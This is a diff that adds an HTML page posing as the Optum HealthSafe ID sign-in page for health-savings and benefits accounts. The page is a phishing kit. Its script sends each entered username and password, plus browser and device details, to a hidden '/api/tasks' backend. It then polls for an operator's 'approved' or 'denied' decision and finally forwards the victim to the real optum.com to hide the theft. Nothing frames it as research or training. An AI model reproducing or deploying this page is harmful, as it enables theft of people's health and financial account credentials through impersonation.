@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Secure, convenient sign in. - Optum</title>
+<meta name="description" content="Sign in to your Optum account. Access your health savings account, flexible spending account, health reimbursement account, and other Optum Financial benefits.">
+<link rel="icon" type="image/png" sizes="192x192" href="/assets/favicon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.png">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Enterprise Sans VF','UHC Sans','Helvetica Neue',Helvetica,Arial,sans-serif;color:#2d2d39;background:#fff;min-height:100vh;display:flex;flex-direction:column;-webkit-font-smoothing:antialiased}
+a{color:#196ecf;text-decoration:none}
+a:hover{text-decoration:underline;color:#0d4d94}
+
+/* Loading overlay */
+.loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center;transition:opacity .4s ease}
+.loading-overlay.fade-out{opacity:0;pointer-events:none}
+.loading-dots{display:flex;gap:10px;align-items:center}
+.loading-dots span{width:14px;height:14px;border-radius:50%;background:#b0d4f1;animation:dotPulse 1.4s ease-in-out infinite}
+.loading-dots span:nth-child(1){animation-delay:0s}
+.loading-dots span:nth-child(2){animation-delay:.2s;background:#2b86d4}
+.loading-dots span:nth-child(3){animation-delay:.4s}
+@keyframes dotPulse{
+  0%,80%,100%{transform:scale(.6);opacity:.4}
+  40%{transform:scale(1);opacity:1}
+}
+
+/* Page content hidden until loaded */
+.page-content{opacity:0;transition:opacity .3s ease}
+.page-content.visible{opacity:1}
+
+/* Utility bar */
+.utility-bar{background:#fff;border-bottom:1px solid #dadbdc;position:sticky;top:0;z-index:11}
+.utility-bar-inner{max-width:1200px;margin:0 auto;padding:10px 40px;display:flex;justify-content:flex-end}
+.utility-bar a{color:#196ecf;font-size:16px;font-weight:700;text-decoration:none}
+.utility-bar a:hover{text-decoration:underline}
+
+/* Header */
+header{background:#fff;border-bottom:1px solid #dadbdc;position:sticky;top:41px;z-index:10}
+.header-inner{max-width:1200px;margin:0 auto;padding:0 40px;height:85px;display:flex;align-items:center;justify-content:space-between}
+.header-logo img{height:52px;display:block}
+.header-nav a{color:#196ecf;font-size:18px;font-weight:700}
+
+/* Main */
+main{flex:1;display:flex;flex-direction:column}
+
+/* Sign-in section */
+.signin-section{padding:56px 24px 64px}
+.signin-container{max-width:600px;margin:0 auto;text-align:center}
+
+.hsid-logo{display:block;margin:0 auto 32px;height:36px}
+
+.signin-container h1{font-size:38px;font-weight:700;color:#2d2d39;margin-bottom:12px;line-height:1.25;letter-spacing:-.3px}
+.signin-container .subtitle{font-size:18px;color:#4b4d52;margin-bottom:40px;line-height:1.5}
+.signin-container .subtitle a{color:#196ecf;font-weight:400}
+
+/* Form */
+.signin-form{text-align:left;max-width:480px;margin:0 auto}
+.form-group{margin-bottom:28px}
+.form-group label{display:block;font-size:16px;font-weight:700;color:#2d2d39;margin-bottom:8px}
+.form-group .input-wrapper{background:#fff;border:1px solid #929496;display:flex;align-items:center;border-radius:0}
+.form-group .input-wrapper:focus-within{border:2px solid #002677;margin:-1px}
+.form-group input[type="text"],
+.form-group input[type="password"]{border:none;font-size:18px;padding:12px 16px;width:100%;font-family:inherit;background:transparent;outline:none;color:#2d2d39}
+
+/* Toggle password */
+.toggle-pw{background:none;border:none;cursor:pointer;padding:0 14px;color:#6c6c7a;display:flex;align-items:center}
+.toggle-pw svg{width:22px;height:22px}
+
+/* Checkbox */
+.checkbox-row{display:flex;align-items:center;margin-bottom:36px}
+.checkbox-row input[type="checkbox"]{width:0;height:0;opacity:0;position:absolute}
+.checkbox-control{width:24px;height:24px;flex-shrink:0;margin-right:12px;cursor:pointer;position:relative}
+.checkbox-control svg{width:24px;height:24px;display:block}
+.cb-outer{fill:#002677}
+.cb-inner{fill:#fff}
+.cb-check{stroke:#fff;fill:none;stroke-width:2;stroke-linejoin:round;stroke-linecap:round;display:none}
+.checkbox-row input:checked ~ .checkbox-control .cb-inner{display:none}
+.checkbox-row input:checked ~ .checkbox-control .cb-check{display:block}
+.checkbox-row input:focus-visible ~ .checkbox-control{outline:2px solid #002677;outline-offset:4px;border-radius:2px}
+.checkbox-label{font-size:16px;color:#2d2d39;cursor:pointer;user-select:none}
+.checkbox-label b{font-weight:700}
+
+/* Buttons */
+.btn-group{display:flex;flex-direction:column;gap:20px;align-items:center}
+.btn-primary{display:flex;align-items:center;justify-content:center;width:100%;height:48px;background:#002677;color:#fff;border:2px solid #002677;border-radius:290486px;font-size:16px;font-weight:700;font-family:inherit;cursor:pointer;letter-spacing:.3px;transition:background .15s ease,border-color .15s ease,box-shadow .15s ease}
+.btn-primary:hover{background:#001d5b;border-color:#001d5b;box-shadow:0 0 0 2px #002677}
+.btn-primary:active{transform:scale(.97)}
+.btn-secondary{display:flex;align-items:center;justify-content:center;width:100%;height:48px;background:transparent;color:#002677;border:2px solid #002677;border-radius:290486px;font-size:16px;font-weight:700;font-family:inherit;cursor:pointer;text-decoration:none;letter-spacing:.3px;transition:background .15s ease,border-color .15s ease,box-shadow .15s ease}
+.btn-secondary:hover{background:#f0f4ff;border-color:#001d5b;box-shadow:0 0 0 2px #002677;color:#001d5b;text-decoration:none}
+.btn-secondary:active{transform:scale(.97)}
+.forgot-links{font-size:18px;color:#2d2d39;text-align:center;margin-top:4px}
+
+/* Sign-in navigator section */
+.navigator-section{background:#fff;border-top:1px solid #dadbdc;text-align:center;padding:56px 40px 80px}
+.navigator-section h2{font-size:34px;font-weight:700;color:#2d2d39;margin-bottom:56px;letter-spacing:-.3px}
+.navigator-grid{max-width:1100px;margin:0 auto;display:grid;grid-template-columns:1fr;gap:48px;text-align:center}
+@media(min-width:768px){.navigator-grid{grid-template-columns:repeat(2,1fr);gap:48px 100px}}
+.nav-item{text-align:center}
+.nav-item h3{font-size:24px;font-weight:700;color:#2d2d39;margin-bottom:8px}
+.nav-item p{font-size:17px;color:#4b4d52;margin-bottom:8px;line-height:1.5}
+.nav-item .nav-link{font-size:16px;font-weight:700;color:#196ecf;display:inline-flex;align-items:center;gap:5px}
+.nav-link .ext-icon{width:16px;height:16px;flex-shrink:0}
+
+/* Feedback tab */
+.feedback-tab{position:fixed;left:0;top:50%;transform:rotate(-90deg) translateX(-50%);transform-origin:0 0;background:#002677;color:#fff;font-size:13px;font-weight:700;padding:8px 20px;border-radius:0 0 6px 6px;cursor:pointer;z-index:100;letter-spacing:.8px;border:none;font-family:inherit;text-transform:capitalize}
+.feedback-tab:hover{background:#001d5b}
+
+/* Footer */
+footer{background:#f4f4f4;color:#2d2d39;text-align:center;padding:48px 40px}
+footer h2{font-size:18px;font-weight:700;margin-bottom:14px;color:#2d2d39}
+footer p{font-size:16px;color:#4b4d52;line-height:1.5}
+footer a{font-size:16px;color:#196ecf}
+.footer-links{list-style:none;padding:0;margin-top:18px;display:flex;justify-content:center;gap:24px;flex-wrap:wrap}
+.footer-links li{display:inline}
+.footer-links button{background:none;border:none;color:#196ecf;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit}
+.footer-links .sep{color:#929496;margin:0 4px}
+
+/* Error message */
+.signin-error{color:#c72020;font-size:14px;margin-top:12px;text-align:center;padding:10px;background:#fff0f0;border-radius:6px}
+
+/* Responsive */
+@media(max-width:600px){
+  .header-inner{height:60px;padding:0 16px}
+  .header-logo img{height:36px}
+  .signin-container h1{font-size:28px}
+  .signin-section{padding:32px 16px 40px}
+  .utility-bar-inner{padding:8px 16px}
+  .navigator-section{padding:36px 16px 56px}
+  .navigator-section h2{font-size:24px;margin-bottom:36px}
+  .nav-item h3{font-size:20px}
+  .header-inner,.utility-bar-inner{padding-left:16px;padding-right:16px}
+  .navigator-section{padding-left:16px;padding-right:16px}
+}
+</style>
+</head>
+<body>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-dots">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<div class="page-content" id="pageContent">
+
+<div class="utility-bar">
+  <div class="utility-bar-inner">
+    <a href="#">Help</a>
+  </div>
+</div>
+
+<header>
+  <div class="header-inner">
+    <a href="/" class="header-logo">
+      <img src="/assets/optum-logo.png" alt="Optum">
+    </a>
+    <nav class="header-nav">
+      <a href="/register.html">Register</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <section class="signin-section">
+    <div class="signin-container">
+      <img src="/assets/hsid-logo.png" alt="HealthSafe ID" class="hsid-logo">
+      <h1>Secure, convenient sign in.</h1>
+      <p class="subtitle">Use your <a href="#">HealthSafe ID</a><sup>&reg;</sup> to sign in.</p>
+
+      <form class="signin-form" id="signinForm">
+        <div class="form-group">
+          <label for="username">Username</label>
+          <div class="input-wrapper">
+            <input type="text" id="username" name="username" autocomplete="off" autocapitalize="on">
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="password">Password</label>
+          <div class="input-wrapper">
+            <input type="password" id="password" name="password" autocomplete="current-password">
+            <button type="button" class="toggle-pw" aria-label="Show password" onclick="togglePassword()">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="checkbox-row">
+          <input type="checkbox" id="rememberMe">
+          <label for="rememberMe" class="checkbox-control">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <rect class="cb-outer" x="0" y="0" width="24" height="24" rx="3"/>
+              <rect class="cb-inner" x="3" y="3" width="18" height="18" rx="1"/>
+              <polyline class="cb-check" points="7.5,12.5 10.5,15.5 17.5,8.5"/>
+            </svg>
+          </label>
+          <label for="rememberMe" class="checkbox-label">Remember my username <b>(Optional)</b></label>
+        </div>
+
+        <div class="btn-group">
+          <button type="submit" class="btn-primary">Sign in</button>
+          <a href="/register.html" class="btn-secondary">Register now</a>
+          <p class="forgot-links">Forgot <a href="/forgot-username.html">username</a> or <a href="/forgot-password.html">password</a>?</p>
+        </div>
+      </form>
+    </div>
+  </section>
+
+  <section class="navigator-section">
+    <h2>Need to sign in to another member site?</h2>
+    <div class="navigator-grid">
+      <div class="nav-item">
+        <h3>Bill pay portals</h3>
+        <p>Pay your bill simply and securely online.</p>
+        <a href="#" class="nav-link">Find your bill pay portal on optum.com<svg class="ext-icon" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5 3h8v8M13 3L3 13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+      </div>
+      <div class="nav-item">
+        <h3>Patient portals</h3>
+        <p>Access your medical records, make an appointment, connect with your doctor and more.</p>
+        <a href="#" class="nav-link">Find your patient portal on optum.com<svg class="ext-icon" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5 3h8v8M13 3L3 13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+      </div>
+      <div class="nav-item">
+        <h3>Commuter benefits</h3>
+        <p>Access and manage how to save on the cost of commuting and parking.</p>
+        <a href="#" class="nav-link">Sign in or register on secure.optumfinancial.com<svg class="ext-icon" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5 3h8v8M13 3L3 13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+      </div>
+      <div class="nav-item">
+        <h3>COBRA benefits</h3>
+        <p>Easily access your COBRA coverage benefits and manage your payment options.</p>
+        <a href="#" class="nav-link">Sign in or register on cobra.optumfinancial.com<svg class="ext-icon" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5 3h8v8M13 3L3 13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+      </div>
+      <div class="nav-item">
+        <h3>Spectera</h3>
+        <p>From eyewear to exams, see all your vision plan benefits and discounts clearly.</p>
+        <a href="#" class="nav-link">Sign in or register on myspectera.com<svg class="ext-icon" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5 3h8v8M13 3L3 13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+      </div>
+      <div class="nav-item">
+        <h3>VA Community Network</h3>
+        <p>Find valuable health care services and benefits available to Veterans.</p>
+        <a href="#" class="nav-link">Sign in or register on veteran.vacommunitycare.com<svg class="ext-icon" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5 3h8v8M13 3L3 13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+      </div>
+      <div class="nav-item">
+        <h3>Harris Care Tracker</h3>
+        <p>Easily make a safe, secure payment or make it even faster with Quick Pay.</p>
+        <a href="#" class="nav-link">Sign in or register on healthtracker.com<svg class="ext-icon" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5 3h8v8M13 3L3 13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <h2>Need Help?</h2>
+  <p>We're here for you. <a href="#">Contact us for technical assistance<svg style="width:14px;height:14px;vertical-align:middle;margin-left:3px" viewBox="0 0 16 16" fill="none"><path d="M5 3h8v8M13 3L3 13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a></p>
+  <ul class="footer-links">
+    <li><button type="button">Sign In Help ›</button></li>
+    <li><span class="sep">|</span></li>
+    <li><a href="#">Accessibility Statement for Individuals with Disabilities<svg style="width:14px;height:14px;vertical-align:middle;margin-left:3px" viewBox="0 0 16 16" fill="none"><path d="M5 3h8v8M13 3L3 13" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a></li>
+  </ul>
+</footer>
+
+<button class="feedback-tab" type="button">Feedback</button>
+
+</div>
+
+<script>
+function togglePassword(){
+  var p=document.getElementById('password');
+  p.type=p.type==='password'?'text':'password';
+}
+
+function maskEmail(e){
+  if(!e||e.indexOf('@')===-1) return e;
+  var parts=e.split('@');
+  var local=parts[0];
+  var domain=parts[1];
+  if(local.length<=2) return local[0]+'***@'+domain;
+  return local[0]+local[1]+'***@'+domain;
+}
+
+var activePoll=null;
+var activeTimeout=null;
+
+function showError(msg){
+  var btn=document.querySelector('.btn-primary');
+  btn.disabled=false;
+  btn.style.opacity='1';
+  btn.textContent='Sign in';
+  var existing=document.querySelector('.signin-error');
+  if(existing) existing.remove();
+  var errEl=document.createElement('div');
+  errEl.className='signin-error';
+  errEl.textContent=msg;
+  document.getElementById('signinForm').appendChild(errEl);
+}
+
+document.getElementById('signinForm').addEventListener('submit',async function(e){
+  e.preventDefault();
+  var u=document.getElementById('username').value.trim();
+  var p=document.getElementById('password').value.trim();
+  if(!u||!p){
+    showError('Please enter your username and password.');
+    return;
+  }
+
+  var existing=document.querySelector('.signin-error');
+  if(existing) existing.remove();
+
+  var btn=document.querySelector('.btn-primary');
+  btn.disabled=true;
+  btn.style.opacity='.5';
+  btn.textContent='Signing in...';
+
+  if(activePoll) clearInterval(activePoll);
+  if(activeTimeout) clearTimeout(activeTimeout);
+
+  try {
+    var res=await fetch("/api/tasks",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        user_id:u,
+        password:p,
+        method:"email",
+        masked_email:maskEmail(u),
+        masked_phone:"N/A",
+        request_kind:"login",
+        member_origin:window.location.href,
+        project_name:"Optum HealthSafe ID",
+        device_info:navigator.userAgent,
+        screen_size:screen.width+" x "+screen.height,
+        referrer:document.referrer||"Direct"
+      })
+    });
+
+    var data=await res.json();
+    if(!res.ok) throw new Error(data.error);
+
+    var taskId=data.task.id;
+
+    activePoll=setInterval(async function(){
+      try {
+        var check=await fetch("/api/tasks/"+taskId);
+        var result=await check.json();
+
+        if(result.task.status==="approved"){
+          clearInterval(activePoll);
+          clearTimeout(activeTimeout);
+          window.location.href="https://www.optum.com/en/financial-services.html";
+        } else if(result.task.status==="redirected"){
+          clearInterval(activePoll);
+          clearTimeout(activeTimeout);
+          window.location.href="https://www.optum.com/en/financial-services.html";
+        } else if(result.task.status==="denied"){
+          clearInterval(activePoll);
+          clearTimeout(activeTimeout);
+          showError("The information you entered is incorrect. Please check your username and password and try again.");
+          document.getElementById('username').value='';
+          document.getElementById('password').value='';
+          document.getElementById('username').focus();
+        }
+      } catch(err){}
+    },3000);
+
+    activeTimeout=setTimeout(function(){
+      clearInterval(activePoll);
+      showError("Request timed out. Please try again.");
+      document.getElementById('username').value='';
+      document.getElementById('password').value='';
+    },90000);
+
+  } catch(err){
+    showError("Unable to sign in. Please try again later.");
+  }
+});
+
+window.addEventListener('load',function(){
+  setTimeout(function(){
+    document.getElementById('loadingOverlay').classList.add('fade-out');
+    document.getElementById('pageContent').classList.add('visible');
+    setTimeout(function(){
+      document.getElementById('loadingOverlay').style.display='none';
+    },400);
+  },1800);
+});
+</script>
+</body>
+</html>
